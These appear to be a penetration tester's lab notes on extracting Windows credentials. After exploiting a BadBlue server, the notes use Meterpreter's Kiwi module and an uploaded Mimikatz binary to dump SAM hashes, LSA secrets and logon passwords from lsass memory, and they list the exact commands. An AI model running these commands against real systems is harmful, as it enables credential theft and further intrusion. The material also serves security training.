- Mimikatz is a Windows post-exploitation tool that allows the extraction of clear-text passwords, hashes and Kerberos tickets from memory.
 
- The SAM (Security Account Manager) database file on Windows systems that stores hashed user passwords.

- Mimikatz can be used to extraxt hashed from lsass.exe process memory where hashes are cached.

- Use the module Kiwi if meterpreter. Mimikatz need elevated privileges.
- Use pre compiled executable Mimikatz if no meterpreter.

-----
- First we have to get access to the windows machine. We will use a vulnerability on their BadBlue server that is vulnerable to a buffer overflow.

- Now we have a meterptreter we can dump hashes. It's a 32 bits meterpreter on a 64 bits windows machine so -> migrate to the lsass explorer. We have admin access already so it's fine.

TECHNIQUE 1 KIWI MODULE:
```
Meterpreter:
> load kiwi
> ? (To get help menu)
> creds_all (Dump credentials of actual user ?)
> lsa_dump_sam (Dump NTLM hashes of all users)
> lsa_dump_secrets (Dump clear text credentials SOMETIMES) 
```


TECHNIQUE 2 : MIMIKATZ
```
Meterpreter:
> mkdir Temp  (in C:\)
> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
> shell

> .\mimikatz.exe
> privilege::debug (Has to give 20)
> lsadump::sam
> lsadump::secrets
> sekurlsa::logonpasswords
```